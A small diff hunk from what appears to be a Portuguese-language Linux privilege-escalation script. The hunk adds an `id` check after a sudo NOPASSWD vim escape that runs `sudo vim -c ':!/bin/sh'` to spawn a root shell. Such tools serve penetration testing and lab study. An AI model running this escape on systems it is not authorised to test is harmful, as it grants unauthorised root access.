@@ -2724,6 +2724,7 @@ EOF
         vim)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
             sudo "$paths" -c ':!/bin/sh'
+            id
             ;;
         vimdiff)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
